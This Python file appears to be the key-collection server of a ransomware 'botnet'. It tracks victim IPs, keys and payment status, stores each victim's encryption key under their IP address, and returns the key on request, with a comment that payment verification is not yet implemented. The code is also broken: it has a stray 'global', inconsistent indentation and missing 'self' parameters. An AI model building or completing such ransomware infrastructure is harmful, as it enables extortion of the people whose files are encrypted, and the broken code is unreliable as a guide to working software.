import socket
import os
import sys
import thread
import pandas as pd
#Function to TL;DR sends a file lmao
class Botnet(object):
	global 
	def __init__(self, input_botnet = None):		
		if input_botnet is None:
			df = pd.DataFrame(columns = ["ip", "key" , "paymentstat"])
   		else:
   			df = pd.read_csv(input_botnet)
	def send_file(file_name, host, port):
	        s = socket.socket()
	        s.connect((host, port))
	        print("trying to connect")

	        file = open(file_name, "rb")
	        l = file.read(1024)
	        while(l):
	                s.send(l)
	                l = file.read(1024)
	        s.shutdown(socket.SHUT_WR)
	        file.close()
	        s.close()

	#Function to handle a client's request


	def on_new_client(client_socket, addr):
		print("connection from: " + addr[0]) 
		filename = addr[0].replace('.', '-') + '.key' #Save client key as ip addr
		file = open(filename, "wb")					  #New file save	
		while True:									  #Recieve that key and write to file then send an 'ack'
			message = client_socket.recv(1024)		  #Start recieving
			if not message:							  #Break at end of message
				break
			if(message == 'nk\n'):					  #if the message asks for the key back, then send it 
				send_file(filename, addr[0], 10000)	  #PAYMENT VERIFICATION IS NOT IMPLEMENTED AT THIS TIME
			else:									  #Else start writing the key
				file.write(message)
				message = "key recieved"			  #Return to the client that we recieved the key
				client_socket.send(message)
		client_socket.close()						  #Close socket 


	def Main():
		host = '0.0.0.0'
		port = 10000
		s = socket.socket()
		s.bind((host, port))
		print("started listening")
		s.listen(5)
		while True:
			c, addr = s.accept()

			thread.start_new_thread(on_new_client, (c,addr))

		c.close()




if __name__ == '__main__':
		Botnet.Main()